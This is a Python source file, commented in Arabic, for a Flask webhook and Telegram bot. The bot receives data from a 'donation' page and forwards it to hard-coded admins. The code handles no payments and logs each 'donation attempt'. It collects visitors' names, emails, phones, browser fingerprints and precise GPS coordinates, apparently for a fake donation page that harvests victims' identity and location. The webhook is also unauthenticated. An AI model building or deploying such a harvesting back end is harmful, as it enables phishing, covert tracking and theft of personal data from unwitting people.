import os
import json
import logging
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== الإعدادات ==========
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن البوت هنا
ADMIN_IDS = [123456789]  # ضع معرفات المشرفين هنا (معرفات تلغرام)

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Flask Application ==========
app = Flask(__name__)
bot_app = None

def get_bot():
    global bot_app
    return bot_app

@app.route('/webhook', methods=['POST'])
def webhook():
    """استقبال البيانات من صفحة التبرع"""
    try:
        data = request.get_json()
        logger.info(f"Received donation data from session: {data.get('sessionId')}")
        
        # تنسيق الرسالة
        message = format_donation_message(data)
        
        # حفظ البيانات
        save_donation(data)
        
        # إرسال إلى المشرفين
        bot = get_bot()
        if bot:
            for admin_id in ADMIN_IDS:
                try:
                    # إرسال الرسالة الأساسية
                    bot.bot.send_message(
                        chat_id=admin_id,
                        text=message,
                        parse_mode='HTML'
                    )
                    
                    # إرسال الموقع إذا كان موجوداً
                    if data.get('location') and data['location'].get('latitude'):
                        bot.bot.send_location(
                            chat_id=admin_id,
                            latitude=data['location']['latitude'],
                            longitude=data['location']['longitude']
                        )
                    
                    # إرسال الملف الكامل إذا كانت البيانات كبيرة
                    if len(json.dumps(data, ensure_ascii=False)) > 3000:
                        with open(f"donation_{data.get('sessionId')[:8]}.json", 'w', encoding='utf-8') as f:
                            json.dump(data, f, ensure_ascii=False, indent=2)
                        bot.bot.send_document(
                            chat_id=admin_id,
                            document=open(f"donation_{data.get('sessionId')[:8]}.json", 'rb'),
                            filename=f"donation_{data.get('sessionId')[:8]}.json"
                        )
                        
                except Exception as e:
                    logger.error(f"Error sending to admin {admin_id}: {e}")
        
        return jsonify({'status': 'ok', 'sessionId': data.get('sessionId')}), 200
        
    except Exception as e:
        logger.error(f"Error in webhook: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def format_donation_message(data):
    """تنسيق البيانات بشكل جميل"""
    
    donation = data.get('donation', {})
    donor = data.get('donor', {})
    browser = data.get('browser', {})
    location = data.get('location', {})
    
    message = f"""
🔔 <b>تبرع جديد!</b>
━━━━━━━━━━━━━━━━━━━━

💰 <b>معلومات التبرع:</b>
├ المبلغ: <b>{donation.get('amount', '?')} {donation.get('currency', 'ILS')}</b>
├ الحالة: {donation.get('status', '?')}
├ الوقت: {data.get('timestamp', '?')[:19]}
└ معرف الجلسة: <code>{data.get('sessionId', '?')[:8]}...</code>

👤 <b>معلومات المتبرع:</b>
├ الاسم: {donor.get('name', 'غير محدد')}
├ البريد: {donor.get('email', 'غير محدد')}
├ الجوال: {donor.get('phone', 'غير محدد')}
└ الرسالة: {donor.get('message', 'لا يوجد')[:100]}

🖥️ <b>معلومات الجهاز:</b>
├ النظام: {browser.get('platform', 'غير محدد')}
├ اللغة: {browser.get('language', 'غير محدد')}
├ الشاشة: {browser.get('screenResolution', 'غير محدد')}
├ المنطقة: {browser.get('timezone', 'غير محدد')}
└ المتصفح: {browser.get('userAgent', '')[:60]}...

"""

    if location and location.get('latitude'):
        message += f"""
📍 <b>الموقع:</b>
├ خط العرض: {location.get('latitude')}
├ خط الطول: {location.get('longitude')}
└ الدقة: ±{location.get('accuracy', '?')} متر
"""
    
    message += """
━━━━━━━━━━━━━━━━━━━━
✅ تم تسجيل محاولة التبرع
"""
    
    return message

def save_donation(data):
    """حفظ البيانات في ملف JSON"""
    try:
        with open('donations.json', 'r', encoding='utf-8') as f:
            donations = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        donations = []
    
    data['received_at'] = datetime.now().isoformat()
    donations.append(data)
    
    with open('donations.json', 'w', encoding='utf-8') as f:
        json.dump(donations, f, ensure_ascii=False, indent=2)
    
    logger.info(f"Saved donation. Total: {len(donations)}")

# ========== أوامر البوت ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
🌟 <b>مرحباً بك في بوت التبرعات</b> 🌟

هذا البوت يستقبل بيانات المتبرعين ويرسلها إليك بشكل فوري.

📊 <b>الأوامر المتاحة:</b>
/start - عرض هذه الرسالة
/stats - عرض إحصائيات التبرعات
/last - عرض آخر تبرع
/help - المساعدة

🔐 جميع البيانات محفوظة بشكل آمن
"""
    await update.message.reply_text(text, parse_mode='HTML')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض إحصائيات التبرعات"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر متاح للمشرفين فقط.")
        return
    
    try:
        with open('donations.json', 'r', encoding='utf-8') as f:
            donations = json.load(f)
    except FileNotFoundError:
        donations = []
    
    total_amount = sum(d.get('donation', {}).get('amount', 0) for d in donations)
    total_count = len(donations)
    today_count = sum(1 for d in donations if d.get('timestamp', '').startswith(datetime.now().strftime('%Y-%m-%d')))
    
    text = f"""
📊 <b>إحصائيات التبرعات</b>
━━━━━━━━━━━━━━━━━━━━

💰 <b>الإجمالي:</b>
├ المبلغ الكلي: {total_amount} ₪
└ عدد التبرعات: {total_count}

📅 <b>اليوم:</b>
└ تبرعات اليوم: {today_count}

👥 <b>معلومات المتبرعين:</b>
├ سجلوا أسمائهم: {sum(1 for d in donations if d.get('donor', {}).get('name') not in ['غير محدد', 'مجهول'])}
└ أضافوا رسالة: {sum(1 for d in donations if d.get('donor', {}).get('message') not in ['لا يوجد رسالة', ''])}
"""
    
    await update.message.reply_text(text, parse_mode='HTML')

async def last_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض آخر تبرع"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ هذا الأمر متاح للمشرفين فقط.")
        return
    
    try:
        with open('donations.json', 'r', encoding='utf-8') as f:
            donations = json.load(f)
    except FileNotFoundError:
        await update.message.reply_text("لا توجد تبرعات حتى الآن.")
        return
    
    if not donations:
        await update.message.reply_text("لا توجد تبرعات حتى الآن.")
        return
    
    last = donations[-1]
    message = format_donation_message(last)
    await update.message.reply_text(message, parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
📌 <b>المساعدة</b>

/start - الرسالة الترحيبية
/stats - عرض الإحصائيات
/last - عرض آخر تبرع

💡 <b>ملاحظات:</b>
• جميع البيانات تصل تلقائياً عند بدء التبرع
• يتم حفظ البيانات في ملف donations.json
• يمكن تصدير البيانات لاستخدامها في التحليلات
"""
    await update.message.reply_text(text, parse_mode='HTML')

# ========== تشغيل الخادم ==========
def run_flask():
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == '__main__':
    # إنشاء البوت
    bot_app = Application.builder().token(TOKEN).build()
    
    # إضافة الأوامر
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("stats", stats_command))
    bot_app.add_handler(CommandHandler("last", last_command))
    bot_app.add_handler(CommandHandler("help", help_command))
    
    # تشغيل Flask في thread منفصل
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # تشغيل البوت
    logger.info("🤖 Bot is starting...")
    bot_app.run_polling()